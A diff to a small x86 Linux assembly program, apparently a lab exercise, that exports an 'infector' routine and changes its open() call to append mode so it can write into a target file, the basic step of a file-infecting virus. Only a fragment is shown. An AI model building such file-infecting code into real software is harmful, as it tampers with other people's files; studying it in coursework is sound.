@@ -5,6 +5,7 @@ section .text
 global _start
 global system_call
 global infection
+global infector
 extern main
 _start:
     pop    dword ecx    ; ecx = argc
@@ -32,7 +33,6 @@ system_call:
     pushad                  ; Save some more caller state
 
     mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
-L2:
     mov     ebx, [ebp+12]   ; Next argument...
     mov     ecx, [ebp+16]   ; Next argument...
     mov     edx, [ebp+20]   ; Next argument...
@@ -73,10 +73,10 @@ infector:
     pushad
     mov eax, 5
     mov ebx, [ebp+8]
-    mov ecx, 2
+    mov ecx, 1025
     mov edx, 0777
     int 0x80
-
+L10:
 
     mov [ebp-4],eax
     mov eax, 4
